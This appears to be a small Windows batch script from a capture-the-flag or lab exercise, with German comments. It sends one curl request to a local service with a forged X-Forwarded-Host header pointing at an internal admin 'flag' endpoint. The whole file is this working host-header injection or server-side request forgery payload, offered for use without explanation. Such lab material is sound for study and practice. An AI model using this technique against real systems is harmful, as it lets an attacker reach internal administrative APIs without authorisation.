@echo off
setlocal

rem In Windows CMD muessen wir die Parameter ganz normal in Anfuehrungszeichen setzen
curl -H "X-Forwarded-Host: internal_api:5000/api/v1/admin/flag?" http://localhost:8080/get-menu

echo.
echo ----------------------------------------
echo [+] Request abgeschlossen.
echo ----------------------------------------
pause